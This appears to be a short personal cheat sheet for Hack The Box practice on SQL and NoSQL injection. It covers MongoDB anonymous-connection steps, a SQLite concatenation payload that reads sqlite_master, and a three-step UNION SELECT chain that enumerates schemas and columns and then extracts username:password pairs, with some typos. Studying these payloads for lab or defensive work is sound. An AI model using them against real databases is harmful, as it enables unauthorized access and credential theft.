SQL Injection is an attack in which malicious SQL statements are injected into SQL
easy to avoid

# Common SQL Verbs
SQL statment begin with verbs
SELECT
INSERT
DELETE
UPDATE
DROP
UNION


# NoSql commands
https://blog.e-zest.com/basic-commands-for-mongodb


## Mongodb


downloading the following tar archive file
```
curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
```

We must then extract the contents of the tar archive file using the tar utility.

```
tar xvf mongodb-linux-x86_64-3.4.7.tgz
```

Navigate to the location where the mongo binary is present.

```
cd mongodb-linux-x86_64-3.4.7/bin
```
Let's now try to connect to the MongoDB server running on the remote host as an anonymous user.


```
show dbs;
use # DATABASE NAME;
show collections;
db.COLLECTION_NAME.find().pretty;


```

```Sql
Nosql injection
` ||  ( COMMAND ) || `

` ||  (select sql from sqlite_master ) || `
select * from TABLE 
select COLUMN from TABBLE
```


# Additional to [[SQL-Injection (SQLi)]]
from [[00 Progress/Boxes/HTB/Linux/Shared/01 Exploit]]

change # to the values


1- union select 1,(select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA,3-- -

2- union select 1,(select group_concat(TABBLE_NAME,':',COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA like '# DATABASE NAME '),3-- -

3- union select 1,(select group_concat(# username ,':',# password) from # user  ,3-- -



